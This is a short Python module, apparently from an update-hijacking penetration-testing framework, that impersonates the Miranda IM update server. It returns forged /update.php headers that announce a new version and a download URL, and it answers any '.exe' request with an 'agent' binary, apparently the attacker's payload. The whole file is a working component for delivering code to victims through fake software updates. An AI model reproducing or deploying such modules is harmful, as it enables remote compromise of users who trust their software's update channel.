from modules import ModuleBase


class Miranda(ModuleBase):
    name = 'Miranda'
    version = '1.0'
    appver = ''
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com >']
    description = ''
    vh = '(update.miranda-im.org)' 
    requests = [
        {   'path': '/update.php',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': '',
            'headers': {
                'content-type': 'text/html',
                'X-Miranda-Update': 'true',
                'X-Miranda-Version': '0.7.15',
                'X-Miranda-Version-Complete': '0.7.15.0',
                'X-Miranda-Notes-URL': 'http://update.miranda-im.org/2009/03/23/miranda-im-v0714-released/',
                'X-Miranda-Download-URL': 'http://update.miranda-im.org/miranda/miranda-im-v0.7.15-ansi.exe'
            }
        }, {
           'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]